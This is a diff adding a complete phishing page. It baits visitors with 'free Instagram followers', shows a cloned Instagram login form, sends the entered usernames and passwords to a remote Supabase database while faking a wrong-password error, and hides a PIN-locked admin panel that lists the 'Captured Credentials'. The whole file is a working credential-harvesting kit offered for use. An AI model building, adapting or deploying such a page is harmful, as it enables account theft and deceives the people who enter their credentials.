@@ -1,0 +1,637 @@
+
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+#page-lure, #page-login, #page-admin { width: 100%; min-height: 520px; }
+
+/* ── LURE PAGE ── */
+#page-lure {
+  background: #000;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  padding: 32px 20px; gap: 0; position: relative; overflow: hidden;
+}
+.lure-bg {
+  position: absolute; inset: 0;
+  background: radial-gradient(ellipse at 50% 0%, #3a0a6e55 0%, transparent 65%),
+              radial-gradient(ellipse at 0% 100%, #c1358430 0%, transparent 55%),
+              radial-gradient(ellipse at 100% 80%, #fcaf4520 0%, transparent 50%);
+}
+.lure-logo { position: relative; z-index: 1; margin-bottom: 18px; }
+.lure-logo svg { width: 56px; height: 56px; filter: drop-shadow(0 0 18px #c13584aa); }
+
+.badge-hot {
+  position: relative; z-index: 1;
+  background: linear-gradient(135deg, #f77737, #c13584);
+  color: #fff; font-size: 11px; font-weight: 700; letter-spacing: 1.5px;
+  padding: 5px 14px; border-radius: 20px; margin-bottom: 20px; text-transform: uppercase;
+}
+
+.lure-headline {
+  position: relative; z-index: 1;
+  font-size: clamp(26px, 6vw, 42px); font-weight: 800; text-align: center;
+  color: #fff; line-height: 1.15; margin-bottom: 10px;
+}
+.lure-headline .grad {
+  background: linear-gradient(90deg, #FCAF45, #F77737, #C13584, #833AB4);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+}
+
+.lure-sub {
+  position: relative; z-index: 1;
+  color: #aaa; font-size: 14px; text-align: center; margin-bottom: 28px; line-height: 1.6;
+}
+
+.timer-box {
+  position: relative; z-index: 1;
+  background: #1a1a1a; border: 1px solid #c13584aa;
+  border-radius: 12px; padding: 14px 28px; margin-bottom: 28px;
+  display: flex; flex-direction: column; align-items: center; gap: 4px;
+  box-shadow: 0 0 24px #c1358430;
+}
+.timer-label { color: #888; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; }
+.timer-val { font-size: 38px; font-weight: 800; color: #fff; letter-spacing: 4px; font-variant-numeric: tabular-nums; }
+.timer-val span { color: #C13584; }
+
+.followers-strip {
+  position: relative; z-index: 1;
+  display: flex; align-items: center; gap: 10px; margin-bottom: 28px;
+}
+.avatars { display: flex; }
+.avatars .av {
+  width: 32px; height: 32px; border-radius: 50%; border: 2px solid #000;
+  margin-right: -8px; overflow: hidden; background: linear-gradient(135deg,#833AB4,#C13584,#F77737);
+  display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #fff;
+}
+.followers-strip p { color: #ccc; font-size: 13px; }
+.followers-strip p strong { color: #fff; }
+
+.btn-lure {
+  position: relative; z-index: 1;
+  background: linear-gradient(135deg, #833AB4, #C13584, #F77737, #FCAF45);
+  border: none; border-radius: 30px; padding: 16px 40px;
+  color: #fff; font-size: 16px; font-weight: 700; cursor: pointer;
+  box-shadow: 0 0 32px #c1358455; transition: transform 0.15s, box-shadow 0.15s;
+  letter-spacing: 0.3px;
+}
+.btn-lure:hover { transform: scale(1.04); box-shadow: 0 0 44px #c1358480; }
+.btn-lure:active { transform: scale(0.97); }
+
+.pulse-ring {
+  position: absolute; z-index: 0;
+  width: 120px; height: 120px; border-radius: 50%;
+  border: 2px solid #C1358440;
+  animation: pulseOut 2s ease-out infinite;
+}
+.pulse-ring:nth-child(2) { animation-delay: 0.6s; }
+.pulse-ring:nth-child(3) { animation-delay: 1.2s; }
+.btn-wrapper { position: relative; display: flex; align-items: center; justify-content: center; z-index: 1; }
+
+@keyframes pulseOut {
+  0% { transform: scale(0.8); opacity: 0.6; }
+  100% { transform: scale(2.2); opacity: 0; }
+}
+
+.lure-fine {
+  position: relative; z-index: 1;
+  color: #444; font-size: 11px; text-align: center; margin-top: 20px;
+}
+
+/* ── LOGIN PAGE ── */
+#page-login {
+  background: #121212;
+  display: none; flex-direction: row;
+  position: relative;
+}
+#page-login.active { display: flex; }
+
+.login-left {
+  width: 50%; background: #000;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  padding: 40px 32px; gap: 20px;
+}
+.login-left h1 {
+  color: #fff; font-size: clamp(18px, 3vw, 26px); font-weight: 600;
+  text-align: center; line-height: 1.4;
+}
+.login-left h1 span { color: #E1306C; }
+
+.phone-stack {
+  position: relative; width: 160px; height: 200px;
+}
+.phone-card {
+  position: absolute; border-radius: 14px; overflow: hidden;
+  border: 2px solid #333; background: #1a1a1a;
+}
+.phone-card img { width: 100%; height: 100%; object-fit: cover; display: block; }
+.pc-back { width: 110px; height: 155px; top: 20px; left: 0; transform: rotate(-6deg); opacity: 0.7; }
+.pc-mid { width: 115px; height: 160px; top: 15px; left: 20px; transform: rotate(1deg); opacity: 0.85; }
+.pc-front { width: 100px; height: 145px; top: 25px; left: 38px; transform: rotate(6deg); }
+
+.login-right {
+  width: 50%; background: #1a1a1a;
+  display: flex; flex-direction: column; align-items: flex-start; justify-content: center;
+  padding: 40px 36px; gap: 14px;
+}
+.login-right h2 { color: #fff; font-size: 15px; font-weight: 600; margin-bottom: 2px; }
+
+.inp {
+  width: 100%; padding: 13px 15px; background: #262626;
+  border: 1px solid #363636; border-radius: 8px; color: #fff;
+  font-size: 14px; outline: none; transition: border-color 0.2s;
+  font-family: inherit;
+}
+.inp::placeholder { color: #888; }
+.inp:focus { border-color: #555; }
+
+.btn-login {
+  width: 100%; padding: 13px; background: #1877F2; border: none;
+  border-radius: 24px; color: #fff; font-size: 14px; font-weight: 600;
+  cursor: pointer; transition: opacity 0.2s; font-family: inherit;
+}
+.btn-login:hover { opacity: 0.88; }
+
+.divider {
+  width: 100%; display: flex; align-items: center; gap: 10px;
+}
+.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #363636; }
+.divider span { color: #555; font-size: 12px; }
+
+.btn-fb {
+  width: 100%; padding: 12px; background: #1877F2; border: none;
+  border-radius: 24px; color: #fff; font-size: 14px; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: opacity 0.2s; font-family: inherit;
+}
+.btn-fb:hover { opacity: 0.88; }
+
+.btn-new {
+  width: 100%; padding: 12px; background: transparent;
+  border: 1px solid #0095F6; border-radius: 24px; color: #0095F6;
+  font-size: 14px; cursor: pointer; transition: background 0.2s; font-family: inherit;
+}
+.btn-new:hover { background: rgba(0,149,246,0.08); }
+
+.forgot { color: #e0e0e0; font-size: 13px; text-align: center; width: 100%; cursor: pointer; }
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; top: 14px; left: 50%; transform: translateX(-50%);
+  background: #323232; color: #fff; padding: 10px 20px; border-radius: 8px;
+  font-size: 13px; opacity: 0; transition: opacity 0.3s; pointer-events: none;
+  white-space: nowrap; z-index: 999;
+}
+.toast.show { opacity: 1; }
+
+/* ── DOT ── */
+.dot-trigger {
+  position: fixed; bottom: 8px; left: 8px; width: 8px; height: 8px;
+  border-radius: 50%; background: #222; cursor: pointer; z-index: 200;
+}
+.dot-trigger:hover { background: #555; }
+
+/* ── ADMIN OVERLAY ── */
+#adminOverlay {
+  display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.88);
+  z-index: 300; align-items: center; justify-content: center;
+}
+#adminOverlay.open { display: flex; }
+.admin-box {
+  background: #1e1e1e; border: 1px solid #333; border-radius: 14px;
+  padding: 32px 28px; width: 300px; text-align: center;
+}
+.admin-box h3 { color: #fff; font-size: 16px; margin-bottom: 6px; }
+.admin-box p { color: #888; font-size: 12px; margin-bottom: 18px; }
+.pin-inp {
+  width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444;
+  border-radius: 8px; color: #fff; font-size: 22px; letter-spacing: 8px;
+  text-align: center; outline: none; margin-bottom: 10px; font-family: inherit;
+}
+.pin-error { color: #E1306C; font-size: 12px; min-height: 16px; margin-bottom: 8px; }
+.btn-enter {
+  width: 100%; padding: 12px; background: #1877F2; border: none;
+  border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600;
+  cursor: pointer; margin-bottom: 8px; font-family: inherit;
+}
+.btn-cancel-pin {
+  width: 100%; padding: 10px; background: none; border: 1px solid #444;
+  border-radius: 8px; color: #888; font-size: 13px; cursor: pointer; font-family: inherit;
+}
+
+/* ── ADMIN PANEL ── */
+#adminPanel {
+  display: none; position: fixed; inset: 0; background: #0d0d0d;
+  z-index: 400; flex-direction: column; overflow-y: auto;
+}
+#adminPanel.open { display: flex; }
+.adm-header {
+  background: #1a1a1a; border-bottom: 1px solid #2a2a2a;
+  padding: 14px 20px; display: flex; align-items: center; justify-content: space-between;
+  position: sticky; top: 0; z-index: 10;
+}
+.adm-header h2 { color: #fff; font-size: 15px; }
+.btn-logout {
+  background: #2a2a2a; border: none; color: #aaa; padding: 6px 14px;
+  border-radius: 6px; cursor: pointer; font-size: 12px; font-family: inherit;
+}
+.btn-logout:hover { background: #3a3a3a; color: #fff; }
+.adm-body { padding: 16px 20px; flex: 1; }
+.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px; }
+.s-card {
+  background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 8px;
+  padding: 12px; text-align: center;
+}
+.s-num { font-size: 26px; font-weight: 700; color: #0095F6; }
+.s-lbl { font-size: 10px; color: #666; margin-top: 2px; }
+.sec-title { color: #555; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 10px; }
+.entry-card {
+  background: #161616; border: 1px solid #222; border-radius: 8px;
+  padding: 12px 14px; margin-bottom: 8px;
+}
+.entry-row { display: flex; gap: 8px; margin-bottom: 4px; align-items: flex-start; }
+.entry-key { color: #555; font-size: 11px; min-width: 68px; padding-top: 1px; }
+.entry-val { color: #ccc; font-size: 13px; word-break: break-all; }
+.entry-val.user { color: #0095F6; font-weight: 500; }
+.entry-val.pass { color: #E1306C; font-family: monospace; font-size: 14px; }
+.no-data { color: #444; text-align: center; padding: 40px 20px; font-size: 14px; }
+.btn-clear {
+  margin-top: 14px; background: #200d0d; border: 1px solid #5a1a1a;
+  color: #e57373; padding: 10px 18px; border-radius: 8px; cursor: pointer;
+  font-size: 13px; font-family: inherit;
+}
+.btn-clear:hover { background: #2e1111; }
+
+/* ── MOBILE ── */
+@media (max-width: 600px) {
+  #page-login { flex-direction: column; }
+  .login-left { width: 100%; padding: 28px 20px 16px; }
+  .login-right { width: 100%; padding: 16px 20px 32px; }
+  .login-left h1 { font-size: 18px; }
+  .phone-stack { width: 140px; height: 170px; }
+  .pc-back { width: 90px; height: 130px; }
+  .pc-mid { width: 95px; height: 135px; }
+  .pc-front { width: 85px; height: 122px; }
+  .stats { grid-template-columns: repeat(3,1fr); }
+}
+</style>
+
+<div class="toast" id="toast"></div>
+<div class="dot-trigger" id="dotTrigger" onclick="openAdminLogin()"></div>
+
+<!-- LURE PAGE -->
+<div id="page-lure">
+  <div class="lure-bg"></div>
+
+  <div class="lure-logo">
+    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="lg1" x1="0" y1="64" x2="64" y2="0" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#FFDC80"/>
+          <stop offset="25%" stop-color="#FCAF45"/>
+          <stop offset="50%" stop-color="#F77737"/>
+          <stop offset="75%" stop-color="#C13584"/>
+          <stop offset="100%" stop-color="#833AB4"/>
+        </linearGradient>
+      </defs>
+      <rect width="64" height="64" rx="16" fill="url(#lg1)"/>
+      <rect x="12" y="12" width="40" height="40" rx="10" fill="none" stroke="#fff" stroke-width="3.5"/>
+      <circle cx="32" cy="32" r="10" fill="none" stroke="#fff" stroke-width="3.5"/>
+      <circle cx="45" cy="19" r="2.5" fill="#fff"/>
+    </svg>
+  </div>
+
+  <div class="badge-hot">🔥 Limited Time Offer</div>
+
+  <div class="lure-headline">
+    Get <span class="grad">10,000 Followers</span><br>Absolutely Free!
+  </div>
+
+  <div class="lure-sub">
+    Boost your Instagram instantly.<br>Real followers, no bots, no credit card needed.
+  </div>
+
+  <div class="timer-box">
+    <div class="timer-label">⏰ Offer expires in</div>
+    <div class="timer-val" id="timerDisp">
+      <span>09</span>:<span id="timerSec">59</span>
+    </div>
+    <div style="color:#666;font-size:11px;margin-top:2px;">Only a few spots left!</div>
+  </div>
+
+  <div class="followers-strip">
+    <div class="avatars">
+      <div class="av">R</div>
+      <div class="av" style="background:linear-gradient(135deg,#C13584,#F77737)">M</div>
+      <div class="av" style="background:linear-gradient(135deg,#FCAF45,#F77737)">A</div>
+      <div class="av" style="background:linear-gradient(135deg,#0095F6,#833AB4)">K</div>
+    </div>
+    <p><strong>2,847 people</strong> claimed this today</p>
+  </div>
+
+  <div class="btn-wrapper">
+    <div class="pulse-ring"></div>
+    <div class="pulse-ring"></div>
+    <div class="pulse-ring"></div>
+    <button class="btn-lure" onclick="goToLogin()">
+      Open Instagram &nbsp;→
+    </button>
+  </div>
+
+  <p class="lure-fine">Free. No spam. Unsubscribe anytime.</p>
+</div>
+
+<!-- LOGIN PAGE -->
+<div id="page-login">
+  <div class="login-left">
+    <svg viewBox="0 0 64 64" fill="none" style="width:52px;height:52px">
+      <defs>
+        <linearGradient id="lg2" x1="0" y1="64" x2="64" y2="0" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#FFDC80"/>
+          <stop offset="25%" stop-color="#FCAF45"/>
+          <stop offset="50%" stop-color="#F77737"/>
+          <stop offset="75%" stop-color="#C13584"/>
+          <stop offset="100%" stop-color="#833AB4"/>
+        </linearGradient>
+      </defs>
+      <rect width="64" height="64" rx="16" fill="url(#lg2)"/>
+      <rect x="12" y="12" width="40" height="40" rx="10" fill="none" stroke="#fff" stroke-width="3.5"/>
+      <circle cx="32" cy="32" r="10" fill="none" stroke="#fff" stroke-width="3.5"/>
+      <circle cx="45" cy="19" r="2.5" fill="#fff"/>
+    </svg>
+
+    <h1>See everyday moments from<br>your <span style="color:#E1306C">close friends</span>.</h1>
+
+    <div class="phone-stack">
+      <div class="phone-card pc-back">
+        <svg viewBox="0 0 110 155" style="width:110px;height:155px">
+          <rect width="110" height="155" fill="#2a1a2e"/>
+          <rect x="8" y="8" width="94" height="139" rx="6" fill="#3a2a3e"/>
+          <circle cx="55" cy="55" r="28" fill="#c13584" opacity="0.4"/>
+          <rect x="15" y="100" width="80" height="8" rx="4" fill="#ffffff20"/>
+          <rect x="15" y="115" width="55" height="6" rx="3" fill="#ffffff15"/>
+          <circle cx="25" cy="135" r="8" fill="#c1358440"/>
+        </svg>
+      </div>
+      <div class="phone-card pc-mid">
+        <svg viewBox="0 0 115 160" style="width:115px;height:160px">
+          <rect width="115" height="160" fill="#1a2a1a"/>
+          <rect x="8" y="8" width="99" height="144" rx="6" fill="#253525"/>
+          <circle cx="57" cy="60" r="30" fill="#833ab4" opacity="0.4"/>
+          <rect x="15" y="105" width="85" height="8" rx="4" fill="#ffffff20"/>
+          <rect x="15" y="120" width="60" height="6" rx="3" fill="#ffffff15"/>
+          <rect x="35" y="140" width="45" height="8" rx="4" fill="#ffffff10"/>
+        </svg>
+      </div>
+      <div class="phone-card pc-front">
+        <svg viewBox="0 0 100 145" style="width:100px;height:145px">
+          <rect width="100" height="145" fill="#1a1a2e"/>
+          <rect x="6" y="6" width="88" height="133" rx="6" fill="#22223a"/>
+          <circle cx="30" cy="28" r="10" fill="#fcaf4560"/>
+          <rect x="46" y="20" width="38" height="6" rx="3" fill="#ffffff25"/>
+          <rect x="46" y="30" width="28" height="4" rx="2" fill="#ffffff15"/>
+          <rect x="8" y="48" width="84" height="50" rx="5" fill="#c1358430"/>
+          <circle cx="50" cy="73" r="18" fill="#f7773740"/>
+          <rect x="8" y="108" width="84" height="8" rx="4" fill="#ffffff20"/>
+          <rect x="8" y="122" width="60" height="6" rx="3" fill="#ffffff15"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="login-right">
+    <h2>Log into Instagram</h2>
+    <input class="inp" type="text" id="uname" placeholder="Mobile number, username or email" autocomplete="off"/>
+    <input class="inp" type="password" id="upass" placeholder="Password" autocomplete="off"/>
+    <button class="btn-login" onclick="handleLogin()">Log in</button>
+    <p class="forgot">Forgot password?</p>
+    <div class="divider"><span>OR</span></div>
+    <button class="btn-fb">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.514c-1.491 0-1.956.93-1.956 1.886v2.269h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
+      Log in with Facebook
+    </button>
+    <button class="btn-new">Create new account</button>
+  </div>
+</div>
+
+<!-- ADMIN PIN OVERLAY -->
+<div id="adminOverlay">
+  <div class="admin-box">
+    <div style="margin-bottom:14px;">
+      <svg width="36" height="36" viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#1877F2"/><path d="M18 9a4.5 4.5 0 100 9 4.5 4.5 0 000-9zM9 27c0-4.5 4.03-8 9-8s9 3.5 9 8" stroke="#fff" stroke-width="2.2" stroke-linecap="round" fill="none"/></svg>
+    </div>
+    <h3>Admin Access</h3>
+    <p>Enter 6-digit PIN to view data</p>
+    <input class="pin-inp" type="password" id="pinInp" maxlength="6" placeholder="• • • • • •" oninput="pinErr.textContent=''" onkeydown="if(event.key==='Enter')verifyPin()"/>
+    <div class="pin-error" id="pinErr"></div>
+    <button class="btn-enter" onclick="verifyPin()">Enter</button>
+    <button class="btn-cancel-pin" onclick="closeAdminLogin()">Cancel</button>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="adminPanel">
+  <div class="adm-header">
+    <h2>Admin Dashboard</h2>
+    <button class="btn-logout" onclick="closeAdminPanel()">Logout</button>
+  </div>
+  <div class="adm-body">
+    <div class="stats">
+      <div class="s-card"><div class="s-num" id="sTot">0</div><div class="s-lbl">Total</div></div>
+      <div class="s-card"><div class="s-num" id="sToday">0</div><div class="s-lbl">Today</div></div>
+      <div class="s-card"><div class="s-num" id="sLast">—</div><div class="s-lbl">Last</div></div>
+    </div>
+    <div class="sec-title">Captured Credentials</div>
+    <div id="entriesWrap"></div>
+    <button class="btn-clear" onclick="clearAll()">🗑 Clear All Data</button>
+  </div>
+</div>
+
+<script>
+const PIN = '808080';
+const KEY = 'ig_entries_v2';
+
+// ── SUPABASE CONFIGURATION ──
+// Replace these with your actual Supabase Project URL and Anon Key
+const SUPABASE_URL = 'YOUR_SUPABASE_URL';
+const SUPABASE_KEY = 'YOUR_SUPABASE_ANON_KEY';
+
+function isSupabaseConfigured() {
+  return SUPABASE_URL && SUPABASE_URL !== 'YOUR_SUPABASE_URL' &&
+         SUPABASE_KEY && SUPABASE_KEY !== 'YOUR_SUPABASE_ANON_KEY';
+}
+
+async function dbGet() {
+  if (!isSupabaseConfigured()) {
+    try { return JSON.parse(localStorage.getItem(KEY) || '[]'); } catch { return []; }
+  }
+  try {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/ig_entries?select=*&order=ts.desc`, {
+      method: 'GET',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`
+      }
+    });
+    if (!res.ok) throw new Error('Supabase fetch failed');
+    return await res.json();
+  } catch (err) {
+    console.error('Supabase get error, falling back to local storage:', err);
+    try { return JSON.parse(localStorage.getItem(KEY) || '[]'); } catch { return []; }
+  }
+}
+
+async function dbAdd(entry) {
+  // Store locally as fallback first
+  try {
+    const local = JSON.parse(localStorage.getItem(KEY) || '[]');
+    local.unshift(entry);
+    localStorage.setItem(KEY, JSON.stringify(local));
+  } catch (e) {
+    console.error('Local storage write error:', e);
+  }
+
+  if (!isSupabaseConfigured()) return true;
+
+  try {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/ig_entries`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=representation'
+      },
+      body: JSON.stringify(entry)
+    });
+    return res.ok;
+  } catch (err) {
+    console.error('Supabase write error:', err);
+    return false;
+  }
+}
+
+async function dbClearAll() {
+  try {
+    localStorage.setItem(KEY, '[]');
+  } catch (e) {
+    console.error('Local storage clear error:', e);
+  }
+
+  if (!isSupabaseConfigured()) return true;
+
+  try {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/ig_entries?ts=gt.0`, {
+      method: 'DELETE',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`
+      }
+    });
+    return res.ok;
+  } catch (err) {
+    console.error('Supabase delete error:', err);
+    return false;
+  }
+}
+
+let timerSecs = 599;
+function fmtTimer(s) {
+  const m = Math.floor(s/60).toString().padStart(2,'0');
+  const sec = (s%60).toString().padStart(2,'0');
+  return '<span>'+m+'</span>:<span>'+sec+'</span>';
+}
+const timerEl = document.getElementById('timerDisp');
+const iv = setInterval(() => {
+  timerSecs--;
+  if (timerSecs < 0) timerSecs = 599;
+  timerEl.innerHTML = fmtTimer(timerSecs);
+}, 1000);
+
+function goToLogin() {
+  document.getElementById('page-lure').style.display = 'none';
+  const lp = document.getElementById('page-login');
+  lp.style.display = 'flex';
+  lp.classList.add('active');
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+async function handleLogin() {
+  const u = document.getElementById('uname').value.trim();
+  const p = document.getElementById('upass').value;
+  if (!u && !p) { showToast('Please enter your credentials'); return; }
+
+  const entry = {
+    username: u || '(empty)',
+    password: p || '(empty)',
+    time: new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'}),
+    ts: Date.now()
+  };
+
+  showToast('Logging in…');
+
+  // Trigger Supabase write
+  await dbAdd(entry);
+
+  document.getElementById('uname').value = '';
+  document.getElementById('upass').value = '';
+  setTimeout(() => showToast('Sorry, your password was incorrect. Please try again.'), 2000);
+}
+
+function openAdminLogin() {
+  document.getElementById('adminOverlay').classList.add('open');
+  setTimeout(() => document.getElementById('pinInp').focus(), 80);
+}
+function closeAdminLogin() {
+  document.getElementById('adminOverlay').classList.remove('open');
+  document.getElementById('pinInp').value = '';
+  document.getElementById('pinErr').textContent = '';
+}
+function verifyPin() {
+  if (document.getElementById('pinInp').value === PIN) {
+    closeAdminLogin();
+    renderAdmin();
+    document.getElementById('adminPanel').classList.add('open');
+  } else {
+    document.getElementById('pinErr').textContent = 'Incorrect PIN. Try again.';
+    document.getElementById('pinInp').value = '';
+  }
+}
+function closeAdminPanel() {
+  document.getElementById('adminPanel').classList.remove('open');
+}
+
+async function renderAdmin() {
+  const wrap = document.getElementById('entriesWrap');
+  wrap.innerHTML = '<p class="no-data">Loading entries from database...</p>';
+
+  const all = await dbGet();
+  const today = new Date().toLocaleDateString('en-IN',{timeZone:'Asia/Kolkata'});
+  const tCount = all.filter(e => new Date(e.ts).toLocaleDateString('en-IN',{timeZone:'Asia/Kolkata'})===today).length;
+  document.getElementById('sTot').textContent = all.length;
+  document.getElementById('sToday').textContent = tCount;
+  document.getElementById('sLast').textContent = all.length ? all[0].time.split(',')[1]?.trim()||'—' : '—';
+
+  if (!all.length) { wrap.innerHTML = '<p class="no-data">No entries yet.</p>'; return; }
+  wrap.innerHTML = all.map((e,i) => `
+    <div class="entry-card">
+      <div class="entry-row"><span class="entry-key">#${all.length-i}</span></div>
+      <div class="entry-row"><span class="entry-key">Username</span><span class="entry-val user">${e.username}</span></div>
+      <div class="entry-row"><span class="entry-key">Password</span><span class="entry-val pass">${e.password}</span></div>
+      <div class="entry-row"><span class="entry-key">Time</span><span class="entry-val" style="font-size:12px;color:#666">${e.time}</span></div>
+    </div>`).join('');
+}
+
+async function clearAll() {
+  if (confirm('Delete all entries permanently?')) {
+    await dbClearAll();
+    renderAdmin();
+  }
+}
+</script>
+
